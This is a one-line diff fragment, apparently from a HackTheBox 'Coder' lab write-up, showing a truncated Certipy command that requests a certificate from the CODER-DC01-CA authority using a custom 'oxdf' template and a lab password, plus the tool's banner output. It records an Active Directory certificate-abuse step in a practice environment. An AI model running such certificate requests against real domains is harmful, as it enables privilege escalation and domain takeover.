@@ -1,0 +1,1 @@
+_PC \$ @dc01.coder.htb -p '0xdf0xdf' -ca CODER-DC01-CA -template oxdf -target dc01.coder.htb Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Requesting certificate via
